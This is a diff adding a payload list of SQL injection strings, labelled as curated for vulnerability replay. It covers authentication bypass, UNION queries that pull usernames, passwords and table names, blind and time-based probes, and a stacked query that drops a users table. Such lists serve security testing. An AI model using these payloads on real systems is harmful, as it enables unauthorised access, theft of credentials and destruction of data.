@@ -1,0 +1,59 @@
+# ============================================================
+# SQL Injection Payloads — Curated for vulnerability replay
+# ============================================================
+
+# --- Authentication bypass ---
+' OR 1=1--
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+admin'--
+' OR 1=1#
+" OR 1=1--
+" OR ""="
+') OR ('1'='1
+
+# --- UNION-based ---
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT username,password FROM users--
+' UNION SELECT 1,2,3--
+' UNION ALL SELECT NULL,NULL,NULL--
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+
+# --- Error-based ---
+' AND 1=CONVERT(int,(SELECT @@version))--
+' AND extractvalue(1,concat(0x7e,(SELECT version())))--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+
+# --- Boolean-based blind ---
+' AND 1=1--
+' AND 1=2--
+' AND 'a'='a
+' AND 'a'='b
+' AND (SELECT COUNT(*) FROM users)>0--
+
+# --- Time-based blind ---
+' AND SLEEP(5)--
+' OR SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+' AND BENCHMARK(5000000,SHA1('test'))--
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+
+# --- URL-encoded variants ---
+%27%20OR%201%3D1--
+%27%20UNION%20SELECT%20NULL--
+
+# --- String terminators / probes ---
+'
+"
+\
+';
+";
+%27
+%22
+
+# --- Stacked queries ---
+'; DROP TABLE users--
+'; SELECT pg_sleep(5)--
